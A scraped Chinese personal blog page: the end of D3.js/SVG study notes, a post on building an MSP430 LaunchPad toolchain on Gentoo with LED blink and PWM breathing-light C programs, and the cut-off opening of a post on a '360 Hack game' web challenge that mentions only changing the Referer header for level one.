<li><code>d3.scale.linear.domain([1,100]).range([0,1])</code></li>
<li><code>d3.max</code></li>
<li><code>d3.min</code></li>
<li>还有些其它量化的和非量化的缩放。</li>
</ul>
<h3 id="SVG_Group元素和D3-js">SVG Group元素和D3.js</h3><ul>
<li>可嵌套的<code>&lt;g&gt;</code>用来分组</li>
<li><code>transform</code>属性和从右到左执行各种tranforming(matrix/translate/scale/skewX/skewY)</li>
<li>transform的转换是相对空间坐标的转换</li>
<li>使用D3.js来分组SVG元素(<code>append</code>)</li>
<li>使用D3.js来转换SVG元素(<code>attr</code>)</li>
</ul>
<h3 id="SVG_Text_元素">SVG Text 元素</h3><ul>
<li><code>text</code>标签及属性, 比如<code>text-anchor</code>属性</li>
<li>使用D3.js创建Text元素，绑定数据，使用数据。</li>
</ul>
<h3 id="SVG坐标轴元素">SVG坐标轴元素</h3><ul>
<li>D3的坐标轴组件，包括水平与竖直坐标轴线、刻度、合适的分隔空间等等。</li>
<li>坐标轴可以更清晰展现变量大小和关系</li>
<li>坐标轴的范围，是否反转、类型、单位等</li>
<li>生成D3.js坐标轴函数(<code>d3.svg.axis().scale($SCALE)</code>)</li>
<li>调用坐标轴函数(<code>var xAxisGroup = svgContainer.append(&quot;g&quot;).call($FUNCTION);</code>)生成坐标轴元素组。</li>
<li>最后创建坐标轴(最上层)</li>
</ul>
<p>然后忽然没了？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？</p>
<p>准备继续看<a href="http://alignedleft.com/tutorials/d3/" target="_blank" rel="external">Scott Murray的D3.js教程</a></p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/microcontroller/2014/05/10/gentoolaunchpad-msp430/" itemprop="url">
                  在Gentoo下开发Launchpad MSP430程序
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-05-10T00:00:00+08:00" content="2014-05-10">
              2014-05-10
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/microcontroller/" itemprop="url" rel="index">
                    <span itemprop="name">microcontroller</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/microcontroller/2014/05/10/gentoolaunchpad-msp430/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="microcontroller/2014/05/10/gentoolaunchpad-msp430/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>同学给我了片申请到的MSP-EXP430G2单片机玩。</p>
<p>从来没有玩过单片机，虽然本科专业还开设了一门叫做单片机的课程，课上完了我也没见到单片机是什么样的，当然，我也没去过几次。研究生阶段选修了一门嵌入式系统设计的课程，只记的老师拿着ppt讲的吐沫星子飞起，似乎ppt上有图，最后却还是没注意单片机是什么样的。</p>
<p>几天前第一次在工地上见到了单片机，一个同学在树莓派的基础上不停假设外设，当时他去采购了一大批物资其中就有一小块单片机。当时一个师兄拿着给我说：这个是单片机。我第一次知道，噢～原来这就是单片机。</p>
<p>没想到几天后一个做硬件的同学给了我块开发板。</p>
<p>同学说：我这里有CCS，但是实验室的正版软件，没法装到其它机器上。你可能没法玩。</p>
<p>我：没事，上学期上嵌入式的课老师给拷过CCS……</p>
<p>同学：！！！！那给你玩吧……</p>
<p>于是在回来在Ti的wiki上被科普了一把，想要使用msp430单片机可以用TI提供的两种IDE，iar和ccs。</p>
<p>ccs提供免费版本，限制16k程序，使用需要遵循美国政府blabla进出口管理条例法律，特别麻烦，不过注册申请后两小时就批准了。</p>
<p>win下的同学还可以去使用iar，同样免费版本限制十六kb程序，我特马第一个程序还不到200字节。我之所以下载ccs，因为ccs有linux版本</p>
<p>但是……我装不上……原因就不说了,各种依赖问题，我本来也不倾向使用IDE。</p>
<p>还有一套开源的东西可以用来开发，gcc/gdb/一堆binutils和c库+mspdebug，自由无限制，不需要注册，没有程序大小限制，开放可信赖，还是熟悉的工具集。</p>
<h2 id="在gentoo上设置开发环境">在gentoo上设置开发环境</h2><blockquote>
<p>Generating a cross-compiler by hand is a long and painful process. This is why it has been fully integrated into Gentoo!</p>
</blockquote>
<p>gentoo下的交叉编译似乎特别容易= =，因为crossdev的存在。</p>
<p>不要问我怎么设置：看这里 <a href="http://www.gentoo.org/proj/en/base/embedded/handbook/cross-compiler.xml?style=printable" target="_blank" rel="external">cross-compiler</a></p>
<p>我之前似乎在linux下写win32程序时把东西都搞好了……不记得当时做了什么，大概就是</p>
<pre><code><span class="title">emerge</span> crossdev
</code></pre><p>紧接着就可以生成msp430平台的系列工具了，我们要指定target、需要gdb等等……</p>
<p>sudo crossdev -S –ov-output /usr/portage/ –ex-gdb -t msp430</p>
<p>经过不那么漫长的等待，你会发现msp430一整套toolchain都已经搭好了。</p>
<p>让我们写个程序吧，LED闪灯小程序 main.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;msp430g2553.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">     <span class="keyword">volatile</span> <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Stop watchdog timer */</span></span><br><span class="line">     WDTCTL = WDTPW | WDTHOLD;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Setup bit 0 of P1 and bit 6 of P1 as output */</span></span><br><span class="line">     P1DIR = <span class="number">0x41</span>;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Setup bit 0 of P1 to 0 and bit 6 of P1 to 1*/</span></span><br><span class="line">     P1OUT = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Loop forever */</span></span><br><span class="line">     <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">         <span class="comment">/* Toggle bit 0,6 of P1 */</span></span><br><span class="line">         P1OUT ^= <span class="number">0x41</span>;</span><br><span class="line">         <span class="comment">/* Just delay */</span></span><br><span class="line">         <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x9000</span>; i++)&#123;&#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实我都是抱着试试看的心理一边改别人的程序一边试的，单片机上确实写的是</p>
<pre><code>MSP<span class="number">430G2553</span>
</code></pre><p>然后编译，编译时要指定芯片，不要问我为什么，msp430-gcc就是这个德性</p>
<pre><code>msp430-gcc -mmcu=msp430g2553 -g main<span class="class">.c</span> -o main.elf
</code></pre><p>最后写进单片机吧。其实板子预先内置的就是这个程序。你可以把它改成只闪一个灯的。</p>
<p>我们要先安装mspdebug。</p>
<blockquote>
<p>MSPDebug is a free debugger for use with MSP430 MCUs</p>
</blockquote>
<pre><code>sudo emerge <span class="comment">--autounmask-write mspdebug</span>
sudo <span class="built_in">dispatch</span>-conf
sudo emerge mspdebug
</code></pre><p>然后指定驱动，至于这个驱动是调试接口的驱动，详情参考<a href="http://www.ti.com.cn/cn/lit/ug/zhcu025e/zhcu025e.pdf" target="_blank" rel="external">这里</a></p>
<pre><code><span class="title">sudo</span> mspdebug rf2500
</code></pre><p>接触读写硬件的权限是必要的。</p>
<pre><code>  ~/Work/msp430 $ sudo mspdebug rf2500                              
MSPDebug version <span class="number">0.22</span> - debugging tool <span class="keyword">for</span> MSP430 MCUs
Copyright (C) <span class="number">2009</span>-<span class="number">2013</span> Daniel Beer &lt;dlbeer@gmail.com&gt;
This <span class="keyword">is</span> free software; see the source <span class="keyword">for</span> copying conditions.  There <span class="keyword">is</span> NO
warranty; <span class="keyword">not</span> even <span class="keyword">for</span> MERCHANTABILITY <span class="keyword">or</span> FITNESS <span class="keyword">FOR</span> A PARTICULAR PURPOSE.

Trying <span class="keyword">to</span> open <span class="keyword">interface</span> <span class="number">1</span> <span class="keyword">on</span> <span class="number">007</span>
rf2500: warning: can<span class="comment">'t detach kernel driver: No such file or directory</span>
Initializing FET...
FET protocol version <span class="keyword">is</span> <span class="number">30394216</span>
<span class="keyword">Set</span> Vcc: <span class="number">3000</span> mV
Configured <span class="keyword">for</span> Spy-Bi-Wire
fet: FET returned <span class="keyword">error</span> code <span class="number">4</span> (Could <span class="keyword">not</span> find device <span class="keyword">or</span> device <span class="keyword">not</span> supported)
fet: command C_IDENT1 failed
<span class="keyword">Using</span> Olimex identification procedure
Device ID: <span class="number">0x2553</span>
   Code start address: <span class="number">0xc000</span>
   Code size         : <span class="number">16384</span> <span class="built_in">byte</span> = <span class="number">16</span> kb
   RAM  start address: <span class="number">0x200</span>
   RAM  <span class="keyword">end</span>   address: <span class="number">0x3ff</span>
   RAM  size         : <span class="number">512</span> <span class="built_in">byte</span> = <span class="number">0</span> kb
Device: MSP430G2xx3
Number <span class="keyword">of</span> breakpoints: <span class="number">2</span>
fet: FET returned NAK
warning: device does <span class="keyword">not</span> support power profiling
Chip ID data: <span class="number">25</span> <span class="number">53</span>

Available commands:
     =           <span class="keyword">erase</span>       isearch     power       save_raw    simio        
     <span class="keyword">alias</span>       <span class="keyword">exit</span>        load        prog        <span class="keyword">set</span>         <span class="keyword">step</span>        
     break       fill        load_raw    read        setbreak    sym          
     cgraph      gdb         md          regs        setwatch    verify      
     delbreak    help        mw          reset       setwatch_r  verify_raw  
     dis         hexout      opt         run         setwatch_w  

Available options:
     color                       gdb_loop                    
     enable_bsl_access           gdbc_xfer_size              
     enable_locked_flash_access  iradix                      
     fet_block_size              quiet                        
     gdb_default_port            

Type <span class="string">"help &lt;topic&gt;"</span> <span class="keyword">for</span> more information.
Use the <span class="string">"opt"</span> command (<span class="string">"help opt"</span>) <span class="keyword">to</span> <span class="keyword">set</span> options.
Press Ctrl+D <span class="keyword">to</span> quit.

(mspdebug)  
</code></pre><p>接着输入</p>
<pre><code><span class="tag">prog</span> <span class="tag">main</span><span class="class">.elf</span>
</code></pre><p>就把程序烧进……不知道什么东西去了。当年嵌入式的课白听了，就记的几个名词……</p>
<pre><code>(mspdebug) prog main.elf
Erasing...
Programming...
Writing  <span class="number">148</span> <span class="keyword">bytes</span> <span class="keyword">at</span> c000 [section: .<span class="keyword">text</span>]...
Writing   <span class="number">32</span> <span class="keyword">bytes</span> <span class="keyword">at</span> ffe0 [section: .vectors]...
Done, <span class="number">180</span> <span class="keyword">bytes</span> total
</code></pre><p>接着run就可以看灯轮流闪了</p>
<pre><code>(mspdebug) <span class="command">run</span>
Running. Press Ctrl+C <span class="keyword">to</span> interrupt...
</code></pre><p>如果要调试，直接输入gdb就可以，</p>
<pre><code>(mspdebug) gdb
Bound <span class="keyword">to</span> port <span class="number">2000.</span> <span class="built_in">Now</span> waiting <span class="keyword">for</span> connection...
</code></pre><p>在另一个终端：</p>
<pre><code>  ~/Work/msp430 ? msp430-gdb -q
(gdb) target remote localhost:<span class="number">2000</span>
Remote debugging <span class="keyword">using</span> localhost:<span class="number">2000</span>
<span class="number">0x0000c076</span> <span class="operator">in</span> ?? ()
(gdb) <span class="built_in">file</span> main.elf
A program is being debugged already.
Are you sure you want <span class="built_in">to</span> change <span class="operator">the</span> <span class="built_in">file</span>? (y <span class="operator">or</span> n) y
Reading symbols <span class="built_in">from</span> /home/lyy/Work/msp430/main.elf...done.
(gdb) n
</code></pre><p>接着还能用makefile简化这些过程，但，我不会makefile……</p>
<h2 id="last_but_not_least">last but not least</h2><p>这套工具链可以在其它linux如debian上很容易的搭建起来，就几个apt-get的事，虽然还没在debian下试过，但debian质量，值得信赖。</p>
<p>在windows下也可以使用这一整套工具，相比ccs来说具有……好处开头说了，支持也不错。</p>
<p>参考文献，不一一标注引用，还有好多忘了:</p>
<ul>
<li><a href="http://coldnew.github.io/blog/2013/11/18_686_g.html" target="_blank" rel="external">http://coldnew.github.io/blog/2013/11/18_686_g.html</a></li>
<li><a href="http://processors.wiki.ti.com/index.php/Download_CCS" target="_blank" rel="external">http://processors.wiki.ti.com/index.php/Download_CCS</a></li>
<li><a href="http://www.ti.com.cn/cn/lit/ug/zhcu010c/zhcu010c.pdf" target="_blank" rel="external">http://www.ti.com.cn/cn/lit/ug/zhcu010c/zhcu010c.pdf</a></li>
<li><a href="http://home.eeworld.com.cn/my/space-uid-139222-blogid-72202.html" target="_blank" rel="external">http://home.eeworld.com.cn/my/space-uid-139222-blogid-72202.html</a></li>
<li><a href="http://blog.sina.com.cn/s/blog_a47d75c60101axsp.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_a47d75c60101axsp.html</a></li>
<li><a href="http://develissimo.com/forum/topic/115418/" target="_blank" rel="external">http://develissimo.com/forum/topic/115418/</a></li>
<li><a href="http://processors.wiki.ti.com/index.php/Blink_your_first_LED" target="_blank" rel="external">http://processors.wiki.ti.com/index.php/Blink_your_first_LED</a></li>
<li><a href="http://43oh.com/2010/08/10-beginner-msp430-tutorials-and-counting/" target="_blank" rel="external">http://43oh.com/2010/08/10-beginner-msp430-tutorials-and-counting/</a></li>
</ul>
<p>哈，第一次玩硬件……向赞助我片子的同学汇报时同学说你怎么进展这么快！！！！</p>
<p>只来得及玩了一天就陷入加班写文档的狂潮之中去了……摔！！！</p>
<p>最后附上个呼吸灯程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Original code is here, //http://osx-launchpad.blogspot.com/2010/11/breathing-led-effect-with-launchpad.html</span></span><br><span class="line"><span class="comment">//This is slight modification to work with Ti CCS devtool</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span>  <span class="string">&lt;msp430.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> idx = <span class="number">0</span>;   <span class="comment">// Index to PWM's duty cycle table (= brightness)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> curve[] = &#123;</span><br><span class="line">    <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">1</span>,</span><br><span class="line">    <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">1</span>,</span><br><span class="line">    <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,</span><br><span class="line">    <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">3</span>,     <span class="number">3</span>,     <span class="number">3</span>,     <span class="number">3</span>,     <span class="number">3</span>,     <span class="number">3</span>,</span><br><span class="line">    <span class="number">4</span>,     <span class="number">4</span>,     <span class="number">4</span>,     <span class="number">4</span>,     <span class="number">4</span>,     <span class="number">5</span>,     <span class="number">5</span>,     <span class="number">5</span>,</span><br><span class="line">    <span class="number">5</span>,     <span class="number">6</span>,     <span class="number">6</span>,     <span class="number">6</span>,     <span class="number">6</span>,     <span class="number">7</span>,     <span class="number">7</span>,     <span class="number">7</span>,</span><br><span class="line">    <span class="number">8</span>,     <span class="number">8</span>,     <span class="number">8</span>,     <span class="number">8</span>,     <span class="number">9</span>,     <span class="number">9</span>,     <span class="number">9</span>,    <span class="number">10</span>,</span><br><span class="line">   <span class="number">10</span>,    <span class="number">10</span>,    <span class="number">11</span>,    <span class="number">11</span>,    <span class="number">11</span>,    <span class="number">12</span>,    <span class="number">12</span>,    <span class="number">13</span>,</span><br><span class="line">   <span class="number">13</span>,    <span class="number">13</span>,    <span class="number">14</span>,    <span class="number">14</span>,    <span class="number">15</span>,    <span class="number">15</span>,    <span class="number">15</span>,    <span class="number">16</span>,</span><br><span class="line">   <span class="number">16</span>,    <span class="number">17</span>,    <span class="number">17</span>,    <span class="number">18</span>,    <span class="number">18</span>,    <span class="number">18</span>,    <span class="number">19</span>,    <span class="number">19</span>,</span><br><span class="line">   <span class="number">20</span>,    <span class="number">20</span>,    <span class="number">21</span>,    <span class="number">21</span>,    <span class="number">22</span>,    <span class="number">22</span>,    <span class="number">23</span>,    <span class="number">23</span>,</span><br><span class="line">   <span class="number">24</span>,    <span class="number">24</span>,    <span class="number">25</span>,    <span class="number">25</span>,    <span class="number">26</span>,    <span class="number">26</span>,    <span class="number">27</span>,    <span class="number">27</span>,</span><br><span class="line">   <span class="number">28</span>,    <span class="number">29</span>,    <span class="number">29</span>,    <span class="number">30</span>,    <span class="number">30</span>,    <span class="number">31</span>,    <span class="number">31</span>,    <span class="number">32</span>,</span><br><span class="line">   <span class="number">33</span>,    <span class="number">33</span>,    <span class="number">34</span>,    <span class="number">34</span>,    <span class="number">35</span>,    <span class="number">36</span>,    <span class="number">36</span>,    <span class="number">37</span>,</span><br><span class="line">   <span class="number">38</span>,    <span class="number">38</span>,    <span class="number">39</span>,    <span class="number">39</span>,    <span class="number">40</span>,    <span class="number">41</span>,    <span class="number">41</span>,    <span class="number">42</span>,</span><br><span class="line">   <span class="number">43</span>,    <span class="number">43</span>,    <span class="number">44</span>,    <span class="number">45</span>,    <span class="number">46</span>,    <span class="number">46</span>,    <span class="number">47</span>,    <span class="number">48</span>,</span><br><span class="line">   <span class="number">48</span>,    <span class="number">49</span>,    <span class="number">50</span>,    <span class="number">50</span>,    <span class="number">51</span>,    <span class="number">52</span>,    <span class="number">53</span>,    <span class="number">53</span>,</span><br><span class="line">   <span class="number">54</span>,    <span class="number">55</span>,    <span class="number">56</span>,    <span class="number">56</span>,    <span class="number">57</span>,    <span class="number">58</span>,    <span class="number">59</span>,    <span class="number">59</span>,</span><br><span class="line">   <span class="number">60</span>,    <span class="number">61</span>,    <span class="number">62</span>,    <span class="number">62</span>,    <span class="number">63</span>,    <span class="number">64</span>,    <span class="number">65</span>,    <span class="number">66</span>,</span><br><span class="line">   <span class="number">66</span>,    <span class="number">67</span>,    <span class="number">68</span>,    <span class="number">69</span>,    <span class="number">70</span>,    <span class="number">70</span>,    <span class="number">71</span>,    <span class="number">72</span>,</span><br><span class="line">   <span class="number">73</span>,    <span class="number">74</span>,    <span class="number">75</span>,    <span class="number">75</span>,    <span class="number">76</span>,    <span class="number">77</span>,    <span class="number">78</span>,    <span class="number">79</span>,</span><br><span class="line">   <span class="number">80</span>,    <span class="number">80</span>,    <span class="number">81</span>,    <span class="number">82</span>,    <span class="number">83</span>,    <span class="number">84</span>,    <span class="number">85</span>,    <span class="number">86</span>,</span><br><span class="line">   <span class="number">87</span>,    <span class="number">87</span>,    <span class="number">88</span>,    <span class="number">89</span>,    <span class="number">90</span>,    <span class="number">91</span>,    <span class="number">92</span>,    <span class="number">93</span>,</span><br><span class="line">   <span class="number">94</span>,    <span class="number">95</span>,    <span class="number">95</span>,    <span class="number">96</span>,    <span class="number">97</span>,    <span class="number">98</span>,    <span class="number">99</span>,   <span class="number">100</span>,</span><br><span class="line">  <span class="number">101</span>,   <span class="number">102</span>,   <span class="number">103</span>,   <span class="number">104</span>,   <span class="number">105</span>,   <span class="number">106</span>,   <span class="number">106</span>,   <span class="number">107</span>,</span><br><span class="line">  <span class="number">108</span>,   <span class="number">109</span>,   <span class="number">110</span>,   <span class="number">111</span>,   <span class="number">112</span>,   <span class="number">113</span>,   <span class="number">114</span>,   <span class="number">115</span>,</span><br><span class="line">  <span class="number">116</span>,   <span class="number">117</span>,   <span class="number">118</span>,   <span class="number">119</span>,   <span class="number">120</span>,   <span class="number">121</span>,   <span class="number">122</span>,   <span class="number">122</span>,</span><br><span class="line">  <span class="number">123</span>,   <span class="number">124</span>,   <span class="number">125</span>,   <span class="number">126</span>,   <span class="number">127</span>,   <span class="number">128</span>,   <span class="number">129</span>,   <span class="number">130</span>,</span><br><span class="line">  <span class="number">131</span>,   <span class="number">132</span>,   <span class="number">133</span>,   <span class="number">134</span>,   <span class="number">135</span>,   <span class="number">136</span>,   <span class="number">137</span>,   <span class="number">138</span>,</span><br><span class="line">  <span class="number">139</span>,   <span class="number">140</span>,   <span class="number">141</span>,   <span class="number">142</span>,   <span class="number">143</span>,   <span class="number">144</span>,   <span class="number">145</span>,   <span class="number">146</span>,</span><br><span class="line">  <span class="number">147</span>,   <span class="number">148</span>,   <span class="number">149</span>,   <span class="number">150</span>,   <span class="number">151</span>,   <span class="number">152</span>,   <span class="number">153</span>,   <span class="number">154</span>,</span><br><span class="line">  <span class="number">155</span>,   <span class="number">156</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="comment">// Stop watchdog</span></span><br><span class="line">  WDTCTL = WDTPW + WDTHOLD;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Set clock to 1 MHz</span></span><br><span class="line">  DCOCTL= <span class="number">0</span>;</span><br><span class="line">  BCSCTL1= CALBC1_1MHZ;</span><br><span class="line">  DCOCTL= CALDCO_1MHZ;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// SMCLK = 1 MHz / 8 = 125 KHz (SLAU144E p.5-15)</span></span><br><span class="line">  BCSCTL2 |= DIVS_3;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Make P1.6 (green led) an output. SLAU144E p.8-3</span></span><br><span class="line">  P1DIR |= BIT6;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// P1.6 = TA0.1 (timer A's output). SLAS694C p.41</span></span><br><span class="line">  P1SEL |= BIT6;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// PWM period = 125 KHz / 625 = 200 Hz</span></span><br><span class="line">  TACCR0 = <span class="number">625</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Source Timer A from SMCLK (TASSEL_2), up mode (MC_1).</span></span><br><span class="line">  <span class="comment">// Up mode counts up to TACCR0. SLAU144E p.12-20</span></span><br><span class="line">  TACTL = TASSEL_2 | MC_1;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// OUTMOD_7 = Reset/set output when the timer counts to TACCR1/TACCR0</span></span><br><span class="line">  <span class="comment">// CCIE = Interrupt when timer counts to TACCR1</span></span><br><span class="line">  TACCTL1 = OUTMOD_7 | CCIE;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Initial CCR1 (= brightness)</span></span><br><span class="line">  TACCR1 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// LPM0 (shut down the CPU) with interrupts enabled</span></span><br><span class="line">  __bis_SR_register(CPUOFF | GIE);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This will be called when timer counts to TACCR1.</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">pragma</span> vector=TIMER0_A1_VECTOR</span></span><br><span class="line">__<span class="function">interrupt <span class="keyword">void</span> <span class="title">Timer_A</span><span class="params">(<span class="keyword">void</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> new_ccr1 = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Clear interrupt flag</span></span><br><span class="line">  TACCTL1 &amp;= ~CCIFG;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (idx &lt; <span class="number">500</span>) &#123;</span><br><span class="line">    new_ccr1 = curve[idx++ &gt;&gt; <span class="number">1</span>];</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (idx &lt; <span class="number">1000</span>) &#123;</span><br><span class="line">    new_ccr1 = curve[(<span class="number">999</span> - idx++) &gt;&gt; <span class="number">1</span>];</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    idx = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Wait to set the new TACCR1 until TAR has gone past it, so that we</span></span><br><span class="line">  <span class="comment">// don't get interrupted again in this period.</span></span><br><span class="line">  <span class="keyword">while</span> (TAR &lt;= new_ccr1);</span><br><span class="line">  TACCR1 = new_ccr1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/life/2014/05/04/360-hack-game/" itemprop="url">
                  360 Hack game网络攻防
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-05-04T00:00:00+08:00" content="2014-05-04">
              2014-05-04
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/life/" itemprop="url" rel="index">
                    <span itemprop="name">life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/life/2014/05/04/360-hack-game/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2014/05/04/360-hack-game/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>不知道把这篇文章归入哪一类，那就life吧。Hack也是life的一部分吧。</p>
<p>最开始是见有人在论坛上问第三道解码的题目。然后lz给出了个地址，就去看了看。后来还挺好玩，就继续做下去了。</p>
<p>没必要在这里披露什么答案，<a href="http://bbs.blackbap.org/thread-5800-1-1.html" target="_blank" rel="external">习科</a>和<a href="http://www.freebuf.com/articles/web/33145.html" target="_blank" rel="external">FreeBuf</a>上已经有详细解答参考答案。就随便记下个人解题过程。</p>
<p>第一关没什么压力。一看就知道显然是更改refer。</p>
